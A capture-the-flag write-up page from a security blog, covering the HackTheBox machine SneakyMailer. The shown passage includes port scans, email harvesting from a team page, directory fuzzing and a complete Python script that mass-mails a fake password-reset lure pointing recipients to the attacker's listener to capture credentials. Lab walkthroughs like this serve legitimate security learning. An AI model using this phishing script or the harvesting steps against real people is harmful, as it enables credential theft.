<!DOCTYPE html><html lang="en" mode="dark" > <!-- The Head v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><title>HackTheBox — SneakyMailer Writeup | b3t4m3</title><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="HackTheBox — SneakyMailer Writeup" /><meta name="author" content="Carlos Sequeira" /><meta property="og:locale" content="en_US" /><meta name="description" content="SneakyMailer starts off with Web enumeration where we discover a list of email addresses and send them phishing mails. One of the user triggers the link and drops his creds via POST request, Using those creds we get access to his mailbox where we find creds for accessing FTP. Inside FTP we find a subdomain web directory to which we can upload our php reverse shell and acquire shell on the machine. Further enumerating we find another subdomain which is a PyPi server, for elevating privileges to next user we leverage this service to upload a malicious python package which drops a SSH public key allowing us to SSH as that user. For root we abuse pip3 sudo privileges permitting us to get root shell." /><meta property="og:description" content="SneakyMailer starts off with Web enumeration where we discover a list of email addresses and send them phishing mails. One of the user triggers the link and drops his creds via POST request, Using those creds we get access to his mailbox where we find creds for accessing FTP. Inside FTP we find a subdomain web directory to which we can upload our php reverse shell and acquire shell on the machine. Further enumerating we find another subdomain which is a PyPi server, for elevating privileges to next user we leverage this service to upload a malicious python package which drops a SSH public key allowing us to SSH as that user. For root we abuse pip3 sudo privileges permitting us to get root shell." /><link rel="canonical" href="http://localhost:4000/posts/SneakyMailer-HTB/" /><meta property="og:url" content="http://localhost:4000/posts/SneakyMailer-HTB/" /><meta property="og:site_name" content="b3t4m3" /><meta property="og:image" content="http://localhost:4000/assets/img/Posts/SneakyM.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-12-03T11:50:00+05:30" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="http://localhost:4000/assets/img/Posts/SneakyM.png" /><meta property="twitter:title" content="HackTheBox — SneakyMailer Writeup" /><meta name="twitter:site" content="@bet4m3" /><meta name="twitter:creator" content="@Carlos Sequeira" /><meta name="google-site-verification" content="CtBtIysuQ8b6k36FI7jqU-o34DRoA_sye50a-RNtPPY" /> <script type="application/ld+json"> {"headline":"HackTheBox — SneakyMailer Writeup","dateModified":"2020-12-03T11:50:00+05:30","datePublished":"2020-12-03T11:50:00+05:30","image":"http://localhost:4000/assets/img/Posts/SneakyM.png","url":"http://localhost:4000/posts/SneakyMailer-HTB/","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/SneakyMailer-HTB/"},"author":{"@type":"Person","name":"Carlos Sequeira"},"description":"SneakyMailer starts off with Web enumeration where we discover a list of email addresses and send them phishing mails. One of the user triggers the link and drops his creds via POST request, Using those creds we get access to his mailbox where we find creds for accessing FTP. Inside FTP we find a subdomain web directory to which we can upload our php reverse shell and acquire shell on the machine. Further enumerating we find another subdomain which is a PyPi server, for elevating privileges to next user we leverage this service to upload a malicious python package which drops a SSH public key allowing us to SSH as that user. For root we abuse pip3 sudo privileges permitting us to get root shell.","@type":"BlogPosting","@context":"https://schema.org"}</script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>HackTheBox — SneakyMailer Writeup | b3t4m3</title><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="HackTheBox — SneakyMailer Writeup" /><meta name="author" content="Carlos Sequeira" /><meta property="og:locale" content="en_US" /><meta name="description" content="SneakyMailer starts off with Web enumeration where we discover a list of email addresses and send them phishing mails. One of the user triggers the link and drops his creds via POST request, Using those creds we get access to his mailbox where we find creds for accessing FTP. Inside FTP we find a subdomain web directory to which we can upload our php reverse shell and acquire shell on the machine. Further enumerating we find another subdomain which is a PyPi server, for elevating privileges to next user we leverage this service to upload a malicious python package which drops a SSH public key allowing us to SSH as that user. For root we abuse pip3 sudo privileges permitting us to get root shell." /><meta property="og:description" content="SneakyMailer starts off with Web enumeration where we discover a list of email addresses and send them phishing mails. One of the user triggers the link and drops his creds via POST request, Using those creds we get access to his mailbox where we find creds for accessing FTP. Inside FTP we find a subdomain web directory to which we can upload our php reverse shell and acquire shell on the machine. Further enumerating we find another subdomain which is a PyPi server, for elevating privileges to next user we leverage this service to upload a malicious python package which drops a SSH public key allowing us to SSH as that user. For root we abuse pip3 sudo privileges permitting us to get root shell." /><link rel="canonical" href="http://localhost:4000/posts/SneakyMailer-HTB/" /><meta property="og:url" content="http://localhost:4000/posts/SneakyMailer-HTB/" /><meta property="og:site_name" content="b3t4m3" /><meta property="og:image" content="http://localhost:4000/assets/img/Posts/SneakyM.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-12-03T11:50:00+05:30" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="http://localhost:4000/assets/img/Posts/SneakyM.png" /><meta property="twitter:title" content="HackTheBox — SneakyMailer Writeup" /><meta name="twitter:site" content="@bet4m3" /><meta name="twitter:creator" content="@Carlos Sequeira" /><meta name="google-site-verification" content="CtBtIysuQ8b6k36FI7jqU-o34DRoA_sye50a-RNtPPY" /> <script type="application/ld+json"> {"headline":"HackTheBox — SneakyMailer Writeup","dateModified":"2020-12-03T11:50:00+05:30","datePublished":"2020-12-03T11:50:00+05:30","image":"http://localhost:4000/assets/img/Posts/SneakyM.png","url":"http://localhost:4000/posts/SneakyMailer-HTB/","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/SneakyMailer-HTB/"},"author":{"@type":"Person","name":"Carlos Sequeira"},"description":"SneakyMailer starts off with Web enumeration where we discover a list of email addresses and send them phishing mails. One of the user triggers the link and drops his creds via POST request, Using those creds we get access to his mailbox where we find creds for accessing FTP. Inside FTP we find a subdomain web directory to which we can upload our php reverse shell and acquire shell on the machine. Further enumerating we find another subdomain which is a PyPi server, for elevating privileges to next user we leverage this service to upload a malicious python package which drops a SSH public key allowing us to SSH as that user. For root we abuse pip3 sudo privileges permitting us to get root shell.","@type":"BlogPosting","@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"> <!-- CSS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" async></script> <!-- JS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --> <script src="/assets/js/post.min.js" async></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/profile.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">b3t4m3</a></div><div class="site-subtitle font-italic">Ethical Hacker | CTF Player | Cybersecurity Specialist</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-home"></i> HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-stream"></i> CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-tags"></i> TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-archive"></i> ARCHIVES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-id-card"></i> ABOUT</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://github.com/bet4m3" target="_blank"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/bet4m3" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:window.open('mailto:' + ['b3t4m3','protonmail.com'].join('@'))" > <i class="fas fa-envelope"></i> </a> <a href="https://www.hackthebox.eu/profile/163155" target="_blank"> <i class="fas fa-cube"></i> </a> <a href="https://www.linkedin.com/in/b3t4m3/" target="_blank"> <i class="fab fa-linkedin"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>HackTheBox — SneakyMailer Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Refactor the HTML structure. --> <!-- Suroundding the markdown table with '<div class="table-wrapper">. and '</div>' --> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HackTheBox — SneakyMailer Writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Thu, Dec 3, 2020, 11:50 AM +0530" > Dec 3, 2020 <i class="unloaded">2020-12-03T11:50:00+05:30</i> </span> by <span class="author"> Carlos Sequeira </span></div><div> Updated <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Thu, Dec 3, 2020, 11:40 AM +0530" > Dec 3, 2020 <i class="unloaded">2020-12-03T11:40:23+05:30</i> </span></div></div><div class="post-content"> <img src="/assets/img/Posts/SneakyM.png" class="post-preview-img"><blockquote><p>SneakyMailer starts off with Web enumeration where we discover a list of email addresses and send them phishing mails. One of the user triggers the link and drops his creds via POST request, Using those creds we get access to his mailbox where we find creds for accessing FTP. Inside FTP we find a subdomain web directory to which we can upload our php reverse shell and acquire shell on the machine. Further enumerating we find another subdomain which is a PyPi server, for elevating privileges to next user we leverage this service to upload a malicious python package which drops a SSH public key allowing us to SSH as that user. For root we abuse pip3 sudo privileges permitting us to get root shell.</p></blockquote><h2 id="reconnaissance">Reconnaissance</h2><h4 id="masscan">masscan</h4><p><code class="language-plaintext highlighter-rouge">masscan</code> discovers seven open TCP ports.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/sneakymailer
→ masscan <span class="nt">-e</span> tun0 <span class="nt">-p1-65535</span> <span class="nt">--rate</span> 500 10.10.10.197 | <span class="nb">tee </span>masscan.ports

Starting masscan 1.0.5 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2020-11-23 18:38:09 GMT
 <span class="nt">--</span> forced options: <span class="nt">-sS</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">--randomize-hosts</span> <span class="nt">-v</span> <span class="nt">--send-eth</span>
Initiating SYN Stealth Scan
Scanning 1 hosts <span class="o">[</span>65535 ports/host]
Discovered open port 22/tcp on 10.10.10.197
Discovered open port 8080/tcp on 10.10.10.197
Discovered open port 80/tcp on 10.10.10.197
Discovered open port 143/tcp on 10.10.10.197
Discovered open port 25/tcp on 10.10.10.197
Discovered open port 993/tcp on 10.10.10.197
Discovered open port 21/tcp on 10.10.10.197
</pre></table></code></div></div><p>Formatting masscan results with <code class="language-plaintext highlighter-rouge">awk</code> and <code class="language-plaintext highlighter-rouge">sed</code> and running the ports against <code class="language-plaintext highlighter-rouge">nmap</code>:</p><h4 id="nmap">nmap</h4><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/sneakymailer
→ <span class="nb">cat </span>masscan.ports | <span class="nb">grep </span>tcp | <span class="nb">sed</span> <span class="s1">'s/Discovered open port //'</span> | <span class="nb">awk</span> <span class="nt">-F</span>/ <span class="s1">'{print $1}'</span> <span class="nv">ORS</span><span class="o">=</span><span class="s1">','</span>
22,8080,80,143,25,993,21,

cfx:  ~/Documents/htb/sneakymailer
→ nmap  <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p22</span>,8080,80,143,25,993,21 10.10.10.197
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-11-24 00:19 IST
Nmap scan report <span class="k">for </span>10.10.10.197
Host is up <span class="o">(</span>0.082s latency<span class="o">)</span><span class="nb">.</span>

PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd <span class="o">(</span>RSA<span class="o">)</span>
|   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a <span class="o">(</span>ED25519<span class="o">)</span>
25/tcp   open  smtp     Postfix smtpd
|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING,
80/tcp   open  http     nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Did not follow redirect to http://sneakycorp.htb
143/tcp  open  imap     Courier Imapd <span class="o">(</span>released 2018<span class="o">)</span>
|_imap-capabilities: QUOTA <span class="nv">UTF8</span><span class="o">=</span>ACCEPTA0001 IMAP4rev1 ENABLE <span class="nv">ACL2</span><span class="o">=</span>UNION OK ACL CAPABILITY completed UIDPLUS <span class="nv">THREAD</span><span class="o">=</span>REFERENCES STARTTLS IDLE CHILDREN SORT <span class="nv">THREAD</span><span class="o">=</span>ORDEREDSUBJECT NAMESPACE
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>localhost/organizationName<span class="o">=</span>Courier Mail Server/stateOrProvinceName<span class="o">=</span>NY/countryName<span class="o">=</span>US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent <span class="nb">time
</span>993/tcp  open  ssl/imap Courier Imapd <span class="o">(</span>released 2018<span class="o">)</span>
|_imap-capabilities: QUOTA <span class="nv">UTF8</span><span class="o">=</span>ACCEPTA0001 IMAP4rev1 ENABLE <span class="nv">ACL2</span><span class="o">=</span>UNION OK ACL CAPABILITY completed UIDPLUS <span class="nv">THREAD</span><span class="o">=</span>ORDEREDSUBJECT SORT IDLE CHILDREN <span class="nv">THREAD</span><span class="o">=</span>REFERENCES <span class="nv">AUTH</span><span class="o">=</span>PLAIN NAMESPACE
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>localhost/organizationName<span class="o">=</span>Courier Mail Server/stateOrProvinceName<span class="o">=</span>NY/countryName<span class="o">=</span>US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent <span class="nb">time
</span>8080/tcp open  http     nginx 1.14.2
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.14.2
|_http-title: Welcome to nginx!
Service Info: Host:  debian<span class="p">;</span> OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>60.40 seconds
</pre></table></code></div></div><p>Port scan summary:</p><ul><li>Port 21: FTP</li><li>Port 22: SSH</li><li>Port 25: SMTP</li><li>Port 80,8080: HTTP Service</li><li>Port 143,993: IMAP</li></ul><h3 id="port-21-ftp">Port 21: FTP</h3><p>Even though <code class="language-plaintext highlighter-rouge">nmap</code> didn’t point out anonymous login, it’s always better to cross check it manually:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/sneakymailer
→ ftp 10.10.10.197
Connected to 10.10.10.197.
220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
Name <span class="o">(</span>10.10.10.197:root<span class="o">)</span>: anonymous
530 Permission denied.
Login failed.
ftp&gt; <span class="nb">exit
</span>221 Goodbye.
</pre></table></code></div></div><p>We are not allowed to login as anonymous.</p><h3 id="port-80-sneakycorphtb">Port 80: sneakycorp.htb</h3><p>Visiting http://10.10.10.197, we get redirected to <a href="http://sneakycorp.htb">http://sneakycorp.htb</a> adding the vhost to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file, we are able to visit the website.</p><p>Home page presents us with some kind of dashboard with two Project status updates:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/SneakyM/website.png" alt="website" /></p><p>Except <a href="http://sneakycorp.htb/team.php"><strong>Team page</strong></a>, all the links are non-functional. However team’s page provides us lots of potential usernames and email addresses:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/SneakyM/team.png" alt="team" /></p><p>Using <code class="language-plaintext highlighter-rouge">awk</code> and <code class="language-plaintext highlighter-rouge">grep</code> we can create a list of all email addresses:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/sneakymailer
→ curl -s http://sneakycorp.htb/team.php | grep sneakymailer.htb | awk -F'&gt;' '{print $2}' | awk -F '&lt;' '{print $1}' &gt; email.txt

</pre></table></code></div></div><p>We have a total of 57 email id’s:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/sneakymailer
→ <span class="nb">wc</span> <span class="nt">-l</span> emails.txt
57 emails.txt

→ <span class="nb">head</span> <span class="nt">-n</span> 5 emails.txt
tigernixon@sneakymailer.htb
garrettwinters@sneakymailer.htb
ashtoncox@sneakymailer.htb
cedrickelly@sneakymailer.htb
airisatou@sneakymailer.htb
</pre></table></code></div></div><h4 id="directory-fuzzing">Directory Fuzzing</h4><p>Using <code class="language-plaintext highlighter-rouge">ffuf</code> to discover hidden files and directories, but unfortunately we don’t find anything interesting</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/sneakymailer
→ ffuf <span class="nt">-c</span> <span class="nt">-r</span> <span class="nt">-u</span> http://sneakycorp.htb/FUZZ <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt <span class="nt">-e</span> .php,.txt <span class="nt">-fc</span> 403

        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : http://sneakycorp.htb/FUZZ
 :: Extensions       : .php .txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response status: 403
________________________________________________

index.php               [Status: 200, Size: 13538, Words: 3948, Lines: 335]
.                       [Status: 200, Size: 13538, Words: 3948, Lines: 335]
team.php                [Status: 200, Size: 26513, Words: 11161, Lines: 660]
:: Progress: [129009/129009] :: Job [1/1] :: 503 req/sec :: Duration: [0:04:16] :: Errors: 0 ::
</span></pre></table></code></div></div><h3 id="port-8080-website">Port 8080: website</h3><p>Visiting port 8080, we get a default nginx installation success page:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/SneakyM/nginx.png" alt="nginx" /></p><p>Since we do not find anything interesting, we can go ahead and look at it later when we have something useful.</p><h2 id="shell-as-www-data">Shell as www-data</h2><h3 id="phishing-e-mail">Phishing E-mail</h3><p>The Box name indicates it has something to do with mails, and we already have acquired a list of emails which we can use to send phishing mail.</p><p>I wrote a python script utilizing smtplib and email.message module which sends a email with body including our host ip, once a user visits this link we get a POST request on <code class="language-plaintext highlighter-rouge">nc</code> listener with users creds.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python3
</span>
<span class="c1">## ultrafisher by ColdFusionX ##
</span>
<span class="kn">import</span> <span class="nn">smtplib</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">email.message</span> <span class="kn">import</span> <span class="n">EmailMessage</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">stats</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="n">progress</span><span class="p">(</span><span class="sa">f</span><span class="s">""</span><span class="p">)</span>
<span class="n">emailsfile</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]).</span><span class="n">readlines</span><span class="p">()</span>

<span class="n">HackerServer</span> <span class="o">=</span> <span class="p">(</span><span class="sa">f</span><span class="s">"http://10.10.14.3:8040"</span><span class="p">)</span> <span class="c1"># &lt;- Change this
</span>
<span class="c1">#Sender address
</span><span class="n">sender</span> <span class="o">=</span> <span class="s">'cold@fusionsecurity.cfx'</span>

<span class="c1">#Loop for Email addresses
</span><span class="k">for</span> <span class="n">recipients</span> <span class="ow">in</span> <span class="n">emailsfile</span><span class="p">:</span>
    <span class="n">recipients</span> <span class="o">=</span> <span class="n">recipients</span><span class="p">.</span><span class="n">strip</span><span class="p">()</span>
    <span class="n">stats</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="sa">f</span><span class="s">"Sending Mail to -&gt; "</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">recipients</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>

    <span class="n">msg</span> <span class="o">=</span> <span class="n">EmailMessage</span> <span class="p">()</span>
    <span class="n">msg</span> <span class="p">[</span><span class="s">'Subject'</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="sa">f</span><span class="s">"Data Breach incident - Reset your password"</span><span class="p">)</span>
    <span class="n">msg</span> <span class="p">[</span><span class="s">'From'</span><span class="p">]</span> <span class="o">=</span> <span class="n">sender</span>
    <span class="n">msg</span> <span class="p">[</span><span class="s">'To'</span><span class="p">]</span> <span class="o">=</span> <span class="n">recipients</span>

<span class="c1">#Email Body
</span>    <span class="n">msg</span><span class="p">.</span><span class="n">set_content</span> <span class="p">(</span><span class="sa">f</span><span class="s">"Please reset your password visiting"</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">HackerServer</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
<span class="c1">#Target Server
</span>    <span class="k">try</span><span class="p">:</span>
        <span class="n">mail</span> <span class="o">=</span> <span class="n">smtplib</span><span class="p">.</span><span class="n">SMTP</span> <span class="p">(</span><span class="s">'10.10.10.197'</span><span class="p">,</span> <span class="mi">25</span><span class="p">)</span>
        <span class="n">mail</span><span class="p">.</span><span class="n">send_message</span> <span class="p">(</span><span class="n">msg</span><span class="p">)</span>
<span class="c1">#Failure Log
</span>    <span class="k">except</span> <span class="n">smtplib</span><span class="p">.</span><span class="n">SMTPException</span><span class="p">:</span>
        <span class="k">print</span><span class="p">()</span>
        <span class="n">log</span><span class="p">.</span><span class="n">failure</span><span class="p">(</span><span class="sa">f</span><span class="s">"Error Sending mail to "</span> <span class="o">+</span> <span class="n">recipients</span><span class="p">)</span>
<span class="k">print</span><span class="p">()</span>
